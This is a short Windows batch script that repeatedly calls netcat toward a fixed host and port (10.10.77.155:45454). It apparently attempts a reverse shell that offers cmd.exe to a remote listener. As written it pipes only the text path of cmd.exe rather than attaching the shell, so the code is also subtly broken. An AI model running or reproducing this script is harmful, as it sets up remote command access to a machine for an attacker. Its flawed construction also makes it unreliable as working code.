@echo off
set host=10.10.77.155
set port=45454

:loop
echo | set /p="C:\Windows\System32\cmd.exe" | nc %host% %port%
goto loop
